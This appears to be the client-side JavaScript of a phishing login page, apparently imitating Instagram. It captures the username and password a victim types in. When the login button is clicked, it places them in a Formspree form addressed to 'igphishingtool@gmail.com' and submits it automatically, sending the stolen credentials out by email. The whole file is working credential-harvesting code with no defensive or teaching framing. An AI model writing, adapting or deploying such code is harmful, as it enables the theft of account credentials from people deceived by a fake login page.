const usernameInput = document.getElementById("username");
const passwordInput = document.getElementById("password");

// * storing data
var userInfo = {
  username: "",
  password: "",
};

usernameInput.addEventListener("input", () => {
  userInfo.username = usernameInput.value;
});
passwordInput.addEventListener("input", () => {
  userInfo.password = passwordInput.value;
});

// * Sending Email
const loginButton = document.querySelector("[data-loginButton]");

loginButton.addEventListener("click", () => {
  const data = document.querySelector(".data");
  data.textContent = userInfo.username + " - " + userInfo.password;

  // * email
  const formspreeEmail = document.querySelector('[data-formspree="email"');
  const formspreeText = document.querySelector('[data-formspree="text"');
  const formspreeSend = document.querySelector('[data-formspree="send');

  const email = "igphishingtool@gmail.com";
  formspreeEmail.textContent = email;

  var emailText = data.innerHTML;
  formspreeText.textContent = emailText;

  // console.log(emailText);

  formspreeSend.click();
});
